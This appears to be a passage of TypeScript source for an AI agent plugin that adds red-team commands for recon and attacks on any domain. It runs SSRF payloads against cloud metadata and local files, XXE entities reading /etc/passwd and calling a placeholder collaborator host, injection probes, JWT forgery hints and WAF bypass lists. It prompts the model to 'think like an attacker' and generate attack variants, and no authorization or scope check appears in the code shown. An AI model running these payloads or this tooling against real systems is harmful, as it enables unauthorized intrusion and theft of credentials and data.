        ctx.ui.notify("Usage: /subdomain <domain>", "error");
        return;
      }

      const target = args.trim().replace(/^https?:\/\//, "").replace(/\/.*$/, "");
      ctx.ui.notify(`🔍 Starting subdomain enumeration for ${target}...`, "info");

      const results: string[] = [];

      // Parallel subdomain enumeration
      const subPromises = [
        // Subfinder
        (async () => {
          ctx.ui.notify("Running: subfinder...", "info");
          const sf = await execCommand(`subfinder -d ${target} -silent 2>/dev/null | head -100`, 180);
          results.push(`## Subfinder\n\`\`\`\n${sf.output || "Not available"}\n\`\`\``);
          return sf.output;
        })(),

        // Certificate Transparency
        (async () => {
          ctx.ui.notify("Running: crt.sh...", "info");
          const crt = await execCommand(
            `curl -s "https://crt.sh/?q=%25.${target}&output=json" 2>/dev/null | jq -r '.[].name_value' 2>/dev/null | sort -u | head -100`,
            60
          );
          results.push(`## Certificate Transparency (crt.sh)\n\`\`\`\n${crt.output || "Query failed"}\n\`\`\``);
          return crt.output;
        })(),

        // DNS brute force
        (async () => {
          ctx.ui.notify("Running: DNS brute force...", "info");
          const brute = await execCommand(`
            for sub in admin api app staging dev test qa uat internal grafana prometheus kibana jenkins gitlab github bitbucket status docs login auth sso cdn static assets mail smtp imap vpn portal dashboard billing payments webhook callback oauth api-v1 api-v2 v1 v2 mobile m www www2 blog shop store support help feedback analytics tracking; do
              result=$(dig +short $sub.${target} A 2>/dev/null | head -1)
              [ -n "$result" ] && echo "$sub.${target} -> $result"
            done
          `, 180);
          results.push(`## DNS Brute Force\n\`\`\`\n${brute.output || "No results"}\n\`\`\``);
          return brute.output;
        })(),
      ];

      await Promise.all(subPromises);

      state.toolsUsed.push("subfinder", "crt.sh", "dig");
      pi.appendEntry("redteam-state", state);

      ctx.ui.notify("✅ Subdomain enumeration complete.", "info");

      pi.sendUserMessage(
        `## Subdomain Enumeration Results for ${target}\n\n${results.join("\n\n")}\n\nAnalyze these results:\n1. Identify all discovered subdomains\n2. Note any interesting services (admin, internal, staging, etc.)\n3. Check for potential subdomain takeover candidates (NXDOMAIN on CNAMEs)\n4. Use \`record_finding\` for any exposed internal services`,
        { deliverAs: "followUp" }
      );
    },
  });

  pi.registerCommand("services", {
    description: "🔌 Third-party service detection from DNS, headers, and JS",
    handler: async (args, ctx) => {
      if (!args) {
        ctx.ui.notify("Usage: /services <domain>", "error");
        return;
      }

      const target = args.trim().replace(/^https?:\/\//, "").replace(/\/.*$/, "");
      ctx.ui.notify(`🔌 Detecting third-party services for ${target}...`, "info");

      // Run the service detection script
      const scriptPath = `${__dirname}/skills/redteam/scripts/detect-services.sh`;
      const result = await execCommand(`bash ${scriptPath} ${target} /tmp/redteam-services-${target} 2>/dev/null || {
        # Inline detection if script not found
        echo "=== DNS TXT Records ==="
        dig +short ${target} TXT
        echo ""
        echo "=== MX Records ==="
        dig +short ${target} MX
        echo ""
        echo "=== Response Headers ==="
        curl -sI https://${target} 2>/dev/null | grep -iE "x-datadog|x-newrelic|sentry|cloudflare|cloudfront|server:|x-powered-by"
      }`, 120);

      state.toolsUsed.push("service-detection");
      pi.appendEntry("redteam-state", state);

      ctx.ui.notify("✅ Service detection complete.", "info");

      pi.sendUserMessage(
        `## Third-Party Service Detection for ${target}\n\n${truncateOutput(result.output, 100)}\n\nAnalyze these services:\n1. List all detected services with their purpose\n2. Note exposure level (public keys, tenant IDs, etc.)\n3. Identify any security-sensitive services (auth, payments, etc.)\n4. Use \`record_finding\` for any exposed secrets or misconfigurations`,
        { deliverAs: "followUp" }
      );
    },
  });

  pi.registerCommand("cors", {
    description: "🌐 CORS misconfiguration testing",
    handler: async (args, ctx) => {
      if (!args) {
        ctx.ui.notify("Usage: /cors <api_url>", "error");
        return;
      }

      let target = args.trim();
      if (!target.startsWith("http")) {
        target = `https://${target}`;
      }

      ctx.ui.notify(`🌐 Testing CORS for ${target}...`, "info");

      const cors = await execCommand(`
        echo "=== CORS Security Test ==="
        echo ""
        
        for origin in "https://evil.com" "https://attacker.com" "null" "http://localhost" "http://127.0.0.1:3000"; do
          echo "Testing origin: $origin"
          response=$(curl -sI "${target}" -H "Origin: $origin" 2>/dev/null)
          
          acao=$(echo "$response" | grep -i "^access-control-allow-origin:" | tr -d '\r')
          acac=$(echo "$response" | grep -i "^access-control-allow-credentials:" | tr -d '\r')
          
          [ -n "$acao" ] && echo "  ACAO: $acao"
          [ -n "$acac" ] && echo "  ACAC: $acac"
          
          if echo "$acao" | grep -qi "$origin\|\\*"; then
            if echo "$acac" | grep -qi "true"; then
              echo "  🔴 CRITICAL: Origin reflected/wildcard with credentials allowed!"
            else
              echo "  🟠 Origin reflected or wildcard (without credentials)"
            fi
          fi
          echo ""
        done
        
        echo "=== Preflight Test ==="
        curl -sI "${target}" -X OPTIONS \
          -H "Origin: https://evil.com" \
          -H "Access-Control-Request-Method: POST" \
          -H "Access-Control-Request-Headers: Authorization" 2>/dev/null | grep -iE "access-control"
      `, 60);

      state.toolsUsed.push("cors-test");
      pi.appendEntry("redteam-state", state);

      ctx.ui.notify("✅ CORS testing complete.", "info");

      pi.sendUserMessage(
        `## CORS Security Test Results for ${target}\n\n\`\`\`\n${cors.output}\n\`\`\`\n\n**Analysis:**\n1. If origin is reflected AND credentials are allowed, this is **CRITICAL**\n2. Any website can make authenticated requests on behalf of users\n3. Use \`record_finding\` with severity CRITICAL if vulnerable\n\n**Impact if vulnerable:**\n- Attacker can steal user data via malicious website\n- Can access API tokens, billing info, user databases\n- Full account takeover possible`,
        { deliverAs: "followUp" }
      );
    },
  });

  pi.registerCommand("endpoints", {
    description: "🔎 API endpoint discovery and method testing",
    handler: async (args, ctx) => {
      if (!args) {
        ctx.ui.notify("Usage: /endpoints <api_base_url>", "error");
        return;
      }

      let target = args.trim();
      if (!target.startsWith("http")) {
        target = `https://${target}`;
      }
      // Remove trailing slash
      target = target.replace(/\/$/, "");

      ctx.ui.notify(`🔎 Discovering endpoints for ${target}...`, "info");

      const endpoints = await execCommand(`
        base="${target}"
        
        echo "| Method | Endpoint | Status | Notes |"
        echo "|--------|----------|--------|-------|"
        
        for endpoint in / /api /api/v1 /api/v2 /v1 /v2 /graphql /users /users/ /user /user/me /auth /auth/login /auth/signup /admin /admin/ /health /status /docs /swagger /openapi.json /.well-known/openid-configuration /user_dashboard/users /user_dashboard/users/ /user_dashboard/logs /internal /tenants /billing /payments; do
          for method in GET POST; do
            response=$(curl -s -o /tmp/resp.txt -w "%{http_code}" -X $method "$base$endpoint" \
              -H "Content-Type: application/json" \
              -d '{}' --connect-timeout 5 2>/dev/null)
            
            # Skip connection failures and 404s
            [ "$response" = "000" ] && continue
            [ "$response" = "404" ] && continue
            
            # Analyze response
            notes=""
            case "$response" in
              200) 
                if grep -qiE "api_key|token|password|secret" /tmp/resp.txt 2>/dev/null; then
                  notes="⚠️ Sensitive data"
                elif grep -qiE '"count":|"results":' /tmp/resp.txt 2>/dev/null; then
                  notes="📊 List data"
                else
                  notes="✓ OK"
                fi
                ;;
              201) notes="✓ Created" ;;
              400) notes="Bad request" ;;
              401) notes="Auth required" ;;
              402) notes="Payment required" ;;
              403) notes="Forbidden" ;;
              405) notes="Method not allowed" ;;
              500) notes="Server error" ;;
              *) notes="" ;;
            esac
            
            echo "| $method | $endpoint | $response | $notes |"
          done
        done
      `, 300);

      state.toolsUsed.push("endpoint-discovery");
      pi.appendEntry("redteam-state", state);

      ctx.ui.notify("✅ Endpoint discovery complete.", "info");

      pi.sendUserMessage(
        `## API Endpoint Discovery for ${target}\n\n${endpoints.output}\n\n**Analysis:**\n1. Any 200 responses on sensitive endpoints (user_dashboard, admin, internal) need investigation\n2. Check if list endpoints expose all users/data (broken access control)\n3. Note endpoints returning "Sensitive data" - these may leak tokens/secrets\n4. Use \`record_finding\` for each security issue discovered`,
        { deliverAs: "followUp" }
      );
    },
  });

  pi.registerCommand("tools", {
    description: "🔧 Check and install red team tools",
    handler: async (_args, ctx) => {
      ctx.ui.notify("🔧 Checking tool availability...", "info");

      const check = await execCommand(`
        echo "| Tool | Status | Description |"
        echo "|------|--------|-------------|"
        
        check_tool() {
          local tool=$1
          local desc=$2
          if command -v $tool &>/dev/null; then
            echo "| $tool | ✓ Installed | $desc |"
          else
            echo "| $tool | ✗ Missing | $desc |"
          fi
        }
        
        check_tool nmap "Port scanner"
        check_tool dig "DNS lookup"
        check_tool curl "HTTP client"
        check_tool jq "JSON processor"
        check_tool whois "WHOIS lookup"
        check_tool subfinder "Subdomain enumeration"
        check_tool httpx "HTTP prober"
        check_tool dnsx "DNS toolkit"
        check_tool nuclei "Vulnerability scanner"
        check_tool nikto "Web scanner"
        check_tool gobuster "Directory brute force"
        check_tool sqlmap "SQL injection"
        check_tool hydra "Brute force"
        check_tool whatweb "Web fingerprinting"
        check_tool ffuf "Web fuzzer"
        check_tool jwt_tool "JWT attacks"
        check_tool interactsh-client "OOB testing"
        check_tool katana "Web crawler"
        check_tool gau "URL discovery"
        check_tool waybackurls "Wayback URLs"
        check_tool gitleaks "Git secrets"
        check_tool trufflehog "Secret scanner"
        check_tool wafw00f "WAF detection"
        check_tool arjun "Parameter discovery"
        check_tool sslyze "SSL analysis"
        check_tool subjack "Subdomain takeover"
      `, 30);

      ctx.ui.notify("✅ Tool check complete.", "info");

      pi.sendUserMessage(
        `## Red Team Tool Availability\n\n${check.output}\n\n**To install missing tools:**\n\`\`\`bash\n# Arch Linux\nyay -S subfinder httpx nuclei nmap nikto gobuster sqlmap hydra\n\n# Debian/Ubuntu/Kali\nsudo apt install nmap nikto gobuster sqlmap hydra\ngo install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest\ngo install github.com/projectdiscovery/httpx/cmd/httpx@latest\ngo install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest\ngo install github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest\ngo install github.com/projectdiscovery/katana/cmd/katana@latest\npip install jwt-tool wafw00f arjun sslyze\n\`\`\``,
        { deliverAs: "followUp" }
      );
    },
  });

  // ============================================================
  // AI-DRIVEN RECONNAISSANCE WITH VARIANT GENERATION
  // ============================================================

  pi.registerCommand("redteam", {
    description: "🧠 AI Analysis - Reconnaissance + AI-generated attack variants",
    handler: async (args, ctx) => {
      if (!args) {
        ctx.ui.notify("Usage: /redteam <domain>", "error");
        return;
      }

      const target = args.trim().replace(/^https?:\/\//, "").replace(/\/.*$/, "");
      state.target = target;
      state.startTime = Date.now();
      state.attackVariants = [];
      state.techStack = [];
      pi.appendEntry("redteam-state", state);

      ctx.ui.notify(`🧠 Starting AI-driven analysis on ${target}...`, "info");

      const reconResults: Record<string, string> = {};
      const detectedTech: string[] = [];
      const detectedEndpoints: string[] = [];
      const detectedServices: string[] = [];

      // Run quick reconnaissance in parallel
      ctx.ui.notify("Running reconnaissance scans...", "info");
      
      const reconPromises = [
        // Technology detection via whatweb
        (async () => {
          const whatweb = await execCommand(`whatweb -a 3 --color=never https://${target} 2>/dev/null`, 60);
          reconResults["whatweb"] = whatweb.output;
          // Parse technologies
          const techMatches = whatweb.output.match(/\[([^\]]+)\]/g) || [];
          techMatches.forEach(t => detectedTech.push(t.replace(/[\[\]]/g, "")));
          ctx.ui.notify("✅ Technology detection complete", "info");
        })(),

        // Wappalyzer-style detection via headers and response
        (async () => {
          const headers = await execCommand(`curl -sI "https://${target}" 2>/dev/null`, 30);
          reconResults["headers"] = headers.output;
          
          // Parse headers for tech
          if (headers.output.toLowerCase().includes("x-powered-by: express")) detectedTech.push("Express", "Node.js");
          if (headers.output.toLowerCase().includes("x-powered-by: php")) detectedTech.push("PHP");
          if (headers.output.toLowerCase().includes("cloudflare")) detectedTech.push("Cloudflare");
          if (headers.output.toLowerCase().includes("cloudfront")) detectedTech.push("CloudFront", "AWS");
          if (headers.output.toLowerCase().includes("x-amz")) detectedTech.push("AWS");
          if (headers.output.toLowerCase().includes("x-vercel")) detectedTech.push("Vercel", "Next.js");
          if (headers.output.toLowerCase().includes("x-datadog")) detectedServices.push("Datadog");
          ctx.ui.notify("✅ Header analysis complete", "info");
        })(),

        // Quick endpoint discovery on api subdomain
        (async () => {
          const endpoints = await execCommand(`
            for ep in /api /api/v1 /api/v2 /graphql /health /docs /swagger /openapi.json; do
              code=$(curl -s -o /dev/null -w "%{http_code}" "https://api.${target}$ep" --connect-timeout 3 2>/dev/null)
              [ "$code" != "000" ] && [ "$code" != "404" ] && echo "$ep ($code)"
            done
          `, 60);
          reconResults["endpoints"] = endpoints.output;
          endpoints.output.split("\n").filter(Boolean).forEach(e => detectedEndpoints.push(e.split(" ")[0]));
          ctx.ui.notify("✅ Endpoint discovery complete", "info");
        })(),

        // Frontend JS analysis for tech stack
        (async () => {
          const js = await execCommand(`
            curl -s "https://${target}" 2>/dev/null | grep -oE 'src="[^"]+\.js[^"]*"' | head -5 | while read src; do
              url=$(echo "$src" | cut -d'"' -f2)
              [[ "$url" =~ ^/ ]] && url="https://${target}$url"
              [[ "$url" =~ ^http ]] && curl -s "$url" 2>/dev/null
            done 2>/dev/null | head -5000
          `, 60);
          
          // Detect frameworks
          if (js.output.includes("__NEXT_DATA__") || js.output.includes("next/")) detectedTech.push("Next.js", "React");
          if (js.output.includes("__NUXT__") || js.output.includes("nuxt")) detectedTech.push("Nuxt.js", "Vue");
          if (js.output.includes("react") || js.output.includes("React")) detectedTech.push("React");
          if (js.output.includes("vue") || js.output.includes("Vue")) detectedTech.push("Vue");
          if (js.output.includes("angular") || js.output.includes("ng-")) detectedTech.push("Angular");
          if (js.output.includes("stripe") || js.output.includes("pk_live") || js.output.includes("pk_test")) {
            detectedTech.push("Stripe");
            detectedServices.push("Stripe");
          }
          if (js.output.includes("posthog") || js.output.includes("PostHog")) detectedServices.push("PostHog");
          if (js.output.includes("intercom") || js.output.includes("Intercom")) detectedServices.push("Intercom");
          if (js.output.includes("auth0") || js.output.includes("Auth0")) {
            detectedTech.push("Auth0", "JWT");
            detectedServices.push("Auth0");
          }
          if (js.output.includes("firebase") || js.output.includes("Firebase")) {
            detectedTech.push("Firebase");
            detectedServices.push("Firebase");
          }
          if (js.output.includes("supabase") || js.output.includes("Supabase")) {
            detectedTech.push("Supabase", "PostgreSQL");
            detectedServices.push("Supabase");
          }
          if (js.output.includes("graphql") || js.output.includes("GraphQL")) detectedTech.push("GraphQL");
          ctx.ui.notify("✅ Frontend analysis complete", "info");
        })(),

        // DNS TXT records for service detection
        (async () => {
          const dns = await execCommand(`dig +short ${target} TXT 2>/dev/null`, 30);
          reconResults["dns-txt"] = dns.output;
          if (dns.output.includes("google-site-verification")) detectedServices.push("Google Workspace");
          if (dns.output.includes("MS=")) detectedServices.push("Microsoft 365");
          if (dns.output.includes("stripe")) detectedServices.push("Stripe");
          ctx.ui.notify("✅ DNS analysis complete", "info");
        })(),
      ];

      await Promise.all(reconPromises);

      // Deduplicate
      const uniqueTech = [...new Set(detectedTech)];
      const uniqueEndpoints = [...new Set(detectedEndpoints)];
      const uniqueServices = [...new Set(detectedServices)];

      state.techStack = uniqueTech;
      state.scanResults = reconResults;
      state.toolsUsed.push("whatweb", "curl", "dig");
      pi.appendEntry("redteam-state", state);

      ctx.ui.notify("✅ Reconnaissance complete. Generating attack variants...", "info");

      // Send to LLM for variant generation
      pi.sendUserMessage(
        `## 🧠 AI-Driven Analysis Complete - ${target}

### Detected Technology Stack
${uniqueTech.length > 0 ? uniqueTech.map(t => `- ${t}`).join("\n") : "- No specific technologies detected"}

### Discovered Endpoints
${uniqueEndpoints.length > 0 ? uniqueEndpoints.map(e => `- ${e}`).join("\n") : "- No endpoints discovered"}

### Third-Party Services
${uniqueServices.length > 0 ? uniqueServices.map(s => `- ${s}`).join("\n") : "- No third-party services detected"}

### Raw Headers
\`\`\`
${truncateOutput(reconResults["headers"] || "", 30)}
\`\`\`

---

## Your Task

**Now generate attack variants using the \`generate_attack_variants\` tool with:**
- target: "${target}"
- techStack: ${JSON.stringify(uniqueTech)}
- endpoints: ${JSON.stringify(uniqueEndpoints)}
- services: ${JSON.stringify(uniqueServices)}

**Then call \`save_attack_variants\` to save the generated variants.**

Generate at least 15 creative attack variants based on the detected stack. Think like an attacker:
1. What vulnerabilities are common in this tech stack?
2. What business logic issues might exist?
3. What misconfigurations are typical?
4. What third-party integration risks exist?
5. What authentication/authorization bypasses might work?`,
        { deliverAs: "followUp" }
      );
    },
  });

  // ============================================================
  // JWT TESTING
  // ============================================================

  pi.registerCommand("jwt", {
    description: "🔐 JWT Security Testing - Test JWT token vulnerabilities",
    handler: async (args, ctx) => {
      if (!args) {
        ctx.ui.notify("Usage: /jwt <token> OR /jwt <url_with_auth>", "error");
        return;
      }

      const input = args.trim();
      ctx.ui.notify(`🔐 Starting JWT security testing...`, "info");

      let token = input;
      if (input.startsWith("http")) {
        // Try to extract JWT from response or ask user
        ctx.ui.notify("Provide a JWT token directly for testing", "info");
        return;
      }

      // Decode and analyze JWT
      const jwtAnalysis = await execCommand(`
        token="${token}"
        
        echo "=== JWT Analysis ==="
        echo ""
        
        # Decode header and payload
        header=$(echo "$token" | cut -d'.' -f1 | base64 -d 2>/dev/null || echo "$token" | cut -d'.' -f1 | base64 -di 2>/dev/null)
        payload=$(echo "$token" | cut -d'.' -f2 | base64 -d 2>/dev/null || echo "$token" | cut -d'.' -f2 | base64 -di 2>/dev/null)
        
        echo "Header:"
        echo "$header" | jq . 2>/dev/null || echo "$header"
        echo ""
        echo "Payload:"
        echo "$payload" | jq . 2>/dev/null || echo "$payload"
        echo ""
        
        # Check algorithm
        alg=$(echo "$header" | jq -r '.alg' 2>/dev/null)
        echo "Algorithm: $alg"
        
        # Security checks
        echo ""
        echo "=== Security Checks ==="
        
        [ "$alg" = "none" ] && echo "🔴 CRITICAL: Algorithm is 'none'!"
        [ "$alg" = "HS256" ] && echo "🟠 WARNING: HS256 - symmetric key, potential for key brute force"
        
        # Check expiration
        exp=$(echo "$payload" | jq -r '.exp' 2>/dev/null)
        if [ -n "$exp" ] && [ "$exp" != "null" ]; then
          now=$(date +%s)
          if [ "$exp" -lt "$now" ]; then
            echo "🔴 Token expired at $(date -d @$exp)"
          else
            echo "✅ Token expires at $(date -d @$exp)"
          fi
        else
          echo "🟠 WARNING: No expiration claim"
        fi
        
        # Check for sensitive data
        echo "$payload" | grep -qiE '"password":|"secret":|"api_key":' && echo "🔴 CRITICAL: Sensitive data in payload!"
        
        # Check issuer
        iss=$(echo "$payload" | jq -r '.iss' 2>/dev/null)
        [ -n "$iss" ] && [ "$iss" != "null" ] && echo "Issuer: $iss"
        
        echo ""
        echo "=== Attack Vectors ==="
        echo "1. Try algorithm confusion: Change RS256 to HS256 and sign with public key"
        echo "2. Try 'none' algorithm: Remove signature, set alg to 'none'"
        echo "3. Try key brute force: Use jwt-tool or hashcat"
        echo "4. Try expired token: Check if backend validates expiration"
        echo "5. Try modified claims: Change user ID, role, email"
      `, 30);

      state.toolsUsed.push("jwt-analysis");
      state.scanResults["jwt"] = jwtAnalysis.output;
      pi.appendEntry("redteam-state", state);

      ctx.ui.notify("✅ JWT analysis complete.", "info");

      // Try jwt_tool if available
      const jwtToolCheck = await execCommand(`command -v jwt_tool && jwt_tool "${token}" 2>/dev/null | head -50 || echo "jwt_tool not installed"`, 30);

      pi.sendUserMessage(
        `## JWT Security Analysis

\`\`\`
${jwtAnalysis.output}
\`\`\`

### jwt_tool Output (if available)
\`\`\`
${truncateOutput(jwtToolCheck.output, 50)}
\`\`\`

**Analysis Tasks:**
1. Check if the algorithm can be changed to 'none'
2. If RS256, try algorithm confusion attack
3. Check if expired tokens are accepted
4. Test claim modification (user ID, roles)
5. Use \`record_finding\` for any vulnerabilities found`,
        { deliverAs: "followUp" }
      );
    },
  });

  // ============================================================
  // SSRF TESTING
  // ============================================================

  pi.registerCommand("ssrf", {
    description: "🌐 SSRF Testing - Test for Server-Side Request Forgery",
    handler: async (args, ctx) => {
      if (!args) {
        ctx.ui.notify("Usage: /ssrf <target_url_with_param> (e.g., /ssrf 'https://api.target.com/fetch?url=')", "error");
        return;
      }

      const target = args.trim();
      ctx.ui.notify(`🌐 Starting SSRF testing on ${target}...`, "info");

      // Start interactsh for OOB detection if available
      let interactshUrl = state.interactshUrl;
      if (!interactshUrl) {
        ctx.ui.notify("Starting interactsh for OOB detection...", "info");
        const interactsh = await execCommand(`timeout 5 interactsh-client -v 2>&1 | grep -oE '[a-z0-9]+\.interactsh\.com' | head -1 || echo ""`, 10);
        if (interactsh.output.includes("interactsh.com")) {
          interactshUrl = interactsh.output.trim();
          state.interactshUrl = interactshUrl;
          ctx.ui.notify(`OOB URL: ${interactshUrl}`, "info");
        }
      }

      // SSRF payloads
      const ssrfPayloads = [
        // Cloud metadata
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://100.100.100.200/latest/meta-data/",
        // Internal services
        "http://localhost:80/",
        "http://localhost:8080/",
        "http://127.0.0.1:6379/",
        "http://127.0.0.1:11211/",
        // Bypass attempts
        "http://0.0.0.0/",
        "http://[::]:80/",
        "http://localhost%00.evil.com/",
        "http://127.1/",
        // Protocol smuggling
        "file:///etc/passwd",
        "dict://localhost:6379/info",
        "gopher://localhost:6379/_",
      ];

      const results: string[] = [];
      results.push("| Payload | Status | Length | Notes |");
      results.push("|---------|--------|--------|-------|");

      for (const payload of ssrfPayloads.slice(0, 10)) {
        const encodedPayload = encodeURIComponent(payload);
        const testUrl = target.includes("=") 
          ? `${target}${encodedPayload}`
          : `${target}?url=${encodedPayload}`;
        
        const test = await execCommand(`
          response=$(curl -s -w "\n%{http_code} %{size_download}" "${testUrl}" --connect-timeout 5 2>/dev/null)
          status=$(echo "$response" | tail -1 | cut -d' ' -f1)
          size=$(echo "$response" | tail -1 | cut -d' ' -f2)
          body=$(echo "$response" | head -n -1 | head -c 200)
          echo "$status|$size|$body"
        `, 10);

        const [status, size, body] = test.output.split("|");
        let notes = "";
        if (body?.includes("ami-id") || body?.includes("instance-id")) notes = "🔴 AWS METADATA!";
        if (body?.includes("root:") || body?.includes("/bin/bash")) notes = "🔴 FILE READ!";
        if (body?.includes("Redis") || body?.includes("PONG")) notes = "🔴 REDIS ACCESS!";
        if (parseInt(size || "0") > 1000) notes = notes || "⚠️ Large response";
        
        results.push(`| ${payload.substring(0, 40)}... | ${status || 'ERR'} | ${size || '0'} | ${notes} |`);
      }

      state.toolsUsed.push("ssrf-test");
      state.scanResults["ssrf"] = results.join("\n");
      pi.appendEntry("redteam-state", state);

      ctx.ui.notify("✅ SSRF testing complete.", "info");

      pi.sendUserMessage(
        `## SSRF Testing Results for ${target}

${results.join("\n")}

${interactshUrl ? `**OOB Detection URL:** ${interactshUrl}\nUse this URL in payloads to detect blind SSRF.` : "**Note:** Install interactsh-client for blind SSRF detection."}

### Additional SSRF Bypass Techniques:
1. Use alternate IP representations: \`127.0.0.1\` → \`2130706433\` (decimal)
2. Use URL encoding: \`http://localhost\` → \`http://%6c%6f%63%61%6c%68%6f%73%74\`
3. Use DNS rebinding if filtering by hostname
4. Try different protocols: \`file://\`, \`dict://\`, \`gopher://\`

Use \`record_finding\` if SSRF is confirmed (typically CRITICAL severity for cloud metadata access).`,
        { deliverAs: "followUp" }
      );
    },
  });

  // ============================================================
  // XXE TESTING
  // ============================================================

  pi.registerCommand("xxe", {
    description: "📄 XXE Testing - Test for XML External Entity injection",
    handler: async (args, ctx) => {
      if (!args) {
        ctx.ui.notify("Usage: /xxe <endpoint_url>", "error");
        return;
      }

      const target = args.trim();
      ctx.ui.notify(`📄 Starting XXE testing on ${target}...`, "info");

      const xxePayloads = [
        // Basic XXE
        `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`,
        // Parameter entity
        `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]><foo>test</foo>`,
        // OOB XXE
        `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://COLLABORATOR/xxe">]><foo>&xxe;</foo>`,
        // CDATA exfil
        `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo><![CDATA[&xxe;]]></foo>`,
      ];

      const results: string[] = [];

      for (const payload of xxePayloads) {
        const test = await execCommand(`
          response=$(curl -s -w "\n%{http_code}" -X POST "${target}" \
            -H "Content-Type: application/xml" \
            -H "Content-Type: text/xml" \
            -d '${payload.replace(/'/g, "'\\''")}' \
            --connect-timeout 10 2>/dev/null)
          status=$(echo "$response" | tail -1)
          body=$(echo "$response" | head -n -1)
          echo "STATUS:$status"
          echo "BODY:$body" | head -c 500
        `, 15);

        let status = "";
        let indicator = "❓";
        if (test.output.includes("root:") || test.output.includes("/bin/bash")) {
          indicator = "🔴 FILE READ CONFIRMED!";
        } else if (test.output.includes("STATUS:200")) {
          indicator = "🟡 200 OK - Inspect response";
          status = "200";
        } else if (test.output.includes("STATUS:500")) {
          indicator = "🟠 500 Error - Possible processing";
        }

        results.push(`**Payload:** \`${payload.substring(0, 60)}...\`\n**Result:** ${indicator}\n`);
      }

      state.toolsUsed.push("xxe-test");
      state.scanResults["xxe"] = results.join("\n");
      pi.appendEntry("redteam-state", state);

      ctx.ui.notify("✅ XXE testing complete.", "info");

      pi.sendUserMessage(
        `## XXE Testing Results for ${target}

${results.join("\n")}

### XXE Exploitation Tips:
1. If file read works, try \`/etc/shadow\`, \`/proc/self/environ\`, \`.env\` files
2. For blind XXE, use OOB with your collaborator server
3. Try SSRF via XXE: \`<!ENTITY xxe SYSTEM "http://internal-service/">\`
4. For .NET targets, try \`<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">\`

Use \`record_finding\` if XXE is confirmed (CRITICAL severity).`,
        { deliverAs: "followUp" }
      );
    },
  });

  // ============================================================
  // WAF DETECTION & BYPASS
  // ============================================================

  pi.registerCommand("waf", {
    description: "🛡️ WAF Detection - Detect and fingerprint Web Application Firewalls",
    handler: async (args, ctx) => {
      if (!args) {
        ctx.ui.notify("Usage: /waf <target_url>", "error");
        return;
      }

      let target = args.trim();
      if (!target.startsWith("http")) target = `https://${target}`;

      ctx.ui.notify(`🛡️ Detecting WAF on ${target}...`, "info");

      // Use wafw00f if available
      const wafw00f = await execCommand(`wafw00f "${target}" 2>/dev/null || echo "wafw00f not installed"`, 60);

      // Manual WAF detection via headers and behavior
      const manual = await execCommand(`
        echo "=== Header-based Detection ==="
        headers=$(curl -sI "${target}" 2>/dev/null)
        
        echo "$headers" | grep -i "server:" | head -1
        echo "$headers" | grep -iE "x-cdn|x-cache|cf-ray|x-akamai|x-sucuri|x-protected" | head -5
        
        # Test with malicious payload
        echo ""
        echo "=== Behavior-based Detection ==="
        
        # XSS payload
        xss_response=$(curl -s -o /dev/null -w "%{http_code}" "${target}?test=<script>alert(1)</script>" --connect-timeout 5 2>/dev/null)
        echo "XSS payload: HTTP $xss_response"
        
        # SQLi payload
        sqli_response=$(curl -s -o /dev/null -w "%{http_code}" "${target}?id=1' OR '1'='1" --connect-timeout 5 2>/dev/null)
        echo "SQLi payload: HTTP $sqli_response"
        
        # Path traversal
        traversal_response=$(curl -s -o /dev/null -w "%{http_code}" "${target}/../../../etc/passwd" --connect-timeout 5 2>/dev/null)
        echo "Path traversal: HTTP $traversal_response"
        
        # Command injection
        cmd_response=$(curl -s -o /dev/null -w "%{http_code}" "${target}?cmd=;ls" --connect-timeout 5 2>/dev/null)
        echo "Command injection: HTTP $cmd_response"
        
        # Check for block responses
        [ "$xss_response" = "403" ] || [ "$sqli_response" = "403" ] && echo ""
        [ "$xss_response" = "403" ] || [ "$sqli_response" = "403" ] && echo "⚠️ WAF likely blocking malicious requests (403 responses)"
      `, 60);

      state.toolsUsed.push("waf-detection");
      state.scanResults["waf"] = wafw00f.output + "\n" + manual.output;
      pi.appendEntry("redteam-state", state);

      ctx.ui.notify("✅ WAF detection complete.", "info");

      pi.sendUserMessage(
        `## WAF Detection Results for ${target}

### wafw00f Output
\`\`\`
${truncateOutput(wafw00f.output, 30)}
\`\`\`

### Manual Detection
\`\`\`
${manual.output}
\`\`\`

### Common WAF Bypass Techniques:

**Cloudflare:**
- Try finding origin IP via historical DNS, SSL certs, or error pages
- Use \`%0d%0a\` for header injection

**AWS WAF:**
- Unicode normalization bypasses
- Chunked encoding

**Generic:**
- Case variation: \`<ScRiPt>\`
- URL encoding: \`%3Cscript%3E\`
- Double encoding: \`%253Cscript%253E\`
- Comments: \`/**/\`, \`--\`, \`#\`
- Null bytes: \`%00\`
- HTTP Parameter Pollution

Use \`record_finding\` to document WAF presence and any bypasses found.`,
        { deliverAs: "followUp" }
      );
    },
  });

  // ============================================================
  // SUBDOMAIN TAKEOVER
  // ============================================================

  pi.registerCommand("takeover", {
    description: "🎯 Subdomain Takeover - Check for vulnerable subdomains",
    handler: async (args, ctx) => {
      if (!args) {
        ctx.ui.notify("Usage: /takeover <domain>", "error");
        return;
      }

      const target = args.trim().replace(/^https?:\/\//, "").replace(/\/.*$/, "");
      ctx.ui.notify(`🎯 Checking subdomain takeover for ${target}...`, "info");

      // First enumerate subdomains
      ctx.ui.notify("Enumerating subdomains...", "info");
      const subdomains = await execCommand(`
        # Combine multiple sources
        (
          subfinder -d ${target} -silent 2>/dev/null
          curl -s "https://crt.sh/?q=%25.${target}&output=json" 2>/dev/null | jq -r '.[].name_value' 2>/dev/null
        ) | sort -u | head -100
      `, 180);

      // Check each subdomain for takeover
      ctx.ui.notify("Checking for takeover vulnerabilities...", "info");
      const takeover = await execCommand(`
        subdomains="${subdomains.output.replace(/\n/g, " ")}"
        
        echo "| Subdomain | CNAME | Status | Takeover? |"
